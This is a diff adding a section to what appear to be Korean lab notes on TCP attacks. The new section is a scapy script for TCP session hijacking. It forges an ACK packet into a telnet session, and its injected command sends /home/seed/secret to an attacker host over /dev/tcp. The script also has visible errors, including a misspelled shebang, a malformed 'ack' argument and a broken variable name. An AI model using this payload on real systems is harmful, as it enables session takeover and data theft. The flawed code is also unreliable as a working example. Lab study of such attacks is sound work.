@@ -279,3 +279,18 @@ def spoof_tcp(pkt):
 	
 pkt=sniff(filter='tcp and src host 10.2.68', prn=spoof_tcp)
 ```
+# (5) TCP 세션 하이재킹 공격
+- 실습을 위해 공격자는 같은 네트워크상에 있으며, 매개변수와 순서번호를 Wireshark를 통해 획득
+```python
+#!/bin/env pyhon3
+import sys
+from scapy.all import *
+
+print("SENDING SESSION HIJACKING PACKET.........")
+IPLayer = IP(src="10.0.2.68", dst="10.0.2.69")
+TCPLayer = TCP(sport=46716, dport=23, flags="A", seq=956606610, ack-3791760010)
+Data = "\r cat /home/seed/secret > /dev/tcp/10.0.2.1/9090\r"
+pkt = IP Layer/TCPLayer/Data
+ls(pkt)
+send(pkt,verbose=0)
+```
